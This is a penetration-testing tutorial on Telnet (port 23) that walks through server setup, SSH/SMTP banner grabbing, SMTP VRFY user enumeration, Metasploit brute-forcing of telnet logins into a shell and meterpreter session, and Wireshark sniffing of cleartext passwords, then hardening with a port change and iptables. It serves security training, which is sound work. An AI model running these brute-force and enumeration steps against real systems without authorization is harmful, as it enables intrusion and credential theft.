@@ -1,0 +1,116 @@
+
+Penetration Testing on Telnet (Port 23)
+
+Welcome to Internal penetration testing on telnet server where you will learn telnet installation and configuration, enumeration and attack, system security and precaution.  
+From Wikipedia 
+Telnet is a protocol used on the Internet or local area networks to provide a bidirectional interactive text-oriented communication facility using a virtual terminal connection. This protocol is used to establish a connection to Transmission Control Protocol (TCP) port number 23, where a Telnet server application (telnetd) is listening.
+Let’s start!!!
+Requirements
+Telnet Server: Ubuntu
+Attacker system: Kali Linux
+Telnet Installation & Configuration in 3 steps
+Installing telnet server is very simple, it will get activated by following three steps:
+apt-get install xinetd telnetd
+
+gedit /etc/inetd.conf
+telnet stream tcp nowait telnetd /usr/sbin/tcpd /usr/sbin/in.telnetd
+
+gedit /etc/xinetd.conf
+# Simple configuration file for xinetd
+#
+# Some defaults, and include /etc/xinetd.d/
+defaults
+{
+# Please note that you need a log_type line to be able to use log_on_success
+# and log_on_failure. The default is the following :
+# log_type = SYSLOG daemon info
+instances = 60
+log_type = SYSLOG authpriv
+log_on_success = HOST PID
+log_on_failure = HOST
+cps = 25 30
+}
+includedir /etc/xinetd.d
+
+Now execute following command to restart the service.
+sudo /etc/init.d/xinetd restart
+
+Now you can ensure whether telnet service is getting activated or not and for this we had scan our own system with nmap.
+nmap –p 23 127.0.0.1
+If service is activated in targeted server then nmap show open STATE for port 23.
+
+A telnet play an important role in banner grabbing of other service running on target system. Open the terminal in kali Linux and type following command for finding the version of SSH service running on targeted machine.
+telnet 192.168.0.106 22
+From given image you can observe that it has successfully shown the SSH version “2.0-openSSH_6.6.1p1”has been installed on target machine.
+
+Similarly we can also find out version and valid user of SMTP server using telnet. Execute following command and find out its version and valid user.
+telnet 192.168.0.25 25
+From given image you can observe that it has successfully shown “220 mail.ignite.lab ESMTP Postfix” has been installed on target machine.
+You can guess for valid user account through following command and if you receive response code 550 it means unknown user account:
+vrfy raj@mail.lab.ignite
+If you received message code 250,251,252 which means server has accept the request and user account is valid.
+But if you received message code 550 it means invalid user account as shown in given image
+vrfy raaz@mail.ignite.lab
+
+An attacker always perform enumeration for finding important information such as software version which known as Banner Grabbing and then identify it state of vulnerability against any exploit.
+Open the terminal in your kali Linux and Load metasploit framework; now type following command to scan for TELNET version.
+use auxiliary/scanner/telnet/telnet_version
+msf auxiliary(telnet_version) > set rhosts 192.168.0.106
+msf auxiliary(telnet_version) > set rport 23
+msf auxiliary(telnet_version) >set threads 5 
+msf auxiliary(telnet_version) > exploit
+From given image you can read the highlighted text which is showing the installed version of TELNET on target’s system.
+
+An attacker always tries to make brute force attack for stealing credential for unauthorized access.
+This module will test a telnet login on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.
+Now type following command to Brute force TELNET login:
+use auxiliary/scanner/telnet/telnet_login
+msf auxiliary(telnet_login) > set rhosts 192.168.0.106
+msf auxiliary(telnet_login) > set user_file /root/Desktop/user.txt
+msf auxiliary(telnet_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary(telnet_login) > set stop_on_success true
+msf auxiliary(telnet_login) > exploit
+From given image you can observe that our TELNET server is not secure against brute force attack because it is showing matching combination of username: raj and password: 123 for login simultaneously it has opened victims command shell as session 1.
+
+From given image you can see now we have unauthorized access on victim’s system as raj@ignite and executed ifconfig to verify the network interface.
+
+We can also convert command shell into meterpreter shell using following command
+sessions –u 1
+From given image you can see that now we are having two sessions; 1st for command shell session and 2nd for meterpreter session.
+
+Telnet, by default, does not encrypt any data sent over the connection (including passwords), and so it is often feasible to eavesdrop on the communications and use the password later for malicious purposes; anybody who has access the network between the two hosts where Telnet is being used can intercept the packets passing between source and destination and obtain login, password and data information.
+From given image you can observe that here the client is login into telnet server by submitting valid credential on other hand attacker is sniffing network packet using wireshark  or other tools.
+
+Here you can notice wireshark had captured telnet information by sniffing the network. It follow similar protocol as FTP where telnet users may authenticate themselves with a clear-text sign-in protocol for username and password. As result attacker can easily sniff login credential.
+
+From given below image you can read the username: raj and password: 123 moreover complete information travelling through packet between source to destination.
+Since Telnet implementations do not support Transport Layer Security (TLS) security and Simple Authentication and Security Layer (SASL) authentication extensions. Therefore in favour of that the Secure Shell (SSH) protocol, first released in 1995 in replaced of Telnet.
+
+In order to secure telnet server admin can forward port from default to specific port to run the service. Open services file using following command for making changes:
+gedit /etc/services
+From given image you can perceive that telnet default uses port 23 for its services; change the port number for telnet service.
+
+From given below image you can compare that we had changed port 23 with 2323, now restart the service.
+service xinetd restart
+
+Verify it using nmap command as given below:
+nmap –p 2323 –sV 192.168.0.106
+
+You can secure telnet server against brute force and from unauthorized access by adding filter using Iptable. Allow only specific IP address to establish connection with telnet server and reject or drop the connection from other IP addresses.
+Now type following command with root permission to add filter for telnet in iptables.
+Iptables –A INPUT –s 192.168.0.104 –p tcp –dport 23 –j ACCEPT
+Above command will allow the traffic from IP address 192.168.0.104 to access the telnet service on port 23.
+Iptables –A INPUT –p tcp –dport 23 –j DROP
+Above command with drop the service for traffic coming from other IP addresses on port 23.
+Restart the service once you add filter in iptables
+sudo /etc/init.d/xinetd restart
+
+Let verify the working of Ipatble by connecting to telnet server from client machine holding IP address 192.168.0.104.
+Great!! Connection established successfully.
+You can confirm it from given below image.
+
+Let verify the working of Ipatble by connecting to telnet server from attacker machine holding different IP address.
+From given below image you can see nothing is happing here because port 23 is down for all other IP addresses
+Awesome!! It means if attacker sniff the valid credential then also will not able to access the telnet server.
+
+ Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
